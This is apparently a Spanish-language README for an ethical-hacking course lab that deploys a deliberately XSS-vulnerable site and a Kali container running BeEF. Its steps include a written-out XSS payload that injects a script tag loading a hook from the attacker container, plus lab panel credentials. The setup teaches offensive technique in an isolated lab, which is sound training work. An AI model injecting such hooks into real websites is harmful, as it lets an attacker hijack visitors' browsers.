# 🏗️ Infraestructura: Lab BeEF XSS Hooking

## 🚀 Despliegue
```bash
cd 04_Ataques_Ingenieria_social/infraestructura/lab_beef_xss/
docker compose up -d
```

## 📦 Contenedores

| Contenedor | IP | Rol | Puerto Host |
|:---|:---|:---|:---|
| `lab_beef_target` | `172.32.0.20` | Sitio vulnerable (XSS) | `localhost:8083` |
| `lab_beef_atacante` | `172.32.0.10` | Kali + BeEF | `localhost:3000` (panel BeEF) |

## 🧪 Flujo del Lab
1. Conecta al atacante: `docker exec -it lab_beef_atacante bash`
2. Inicia BeEF: `beef-xss`
3. Accede al panel: `http://localhost:3000/ui/panel` (beef / beef123)
4. Inyecta el hook via XSS: `http://localhost:8083/?msg=<script src="http://172.32.0.10:3000/hook.js"></script>`
5. Ve el navegador enganchado en el panel de BeEF.

## 🧹 Limpieza
```bash
docker compose down
```

---
*Módulo 04 - Cisco Ethical Hacker*
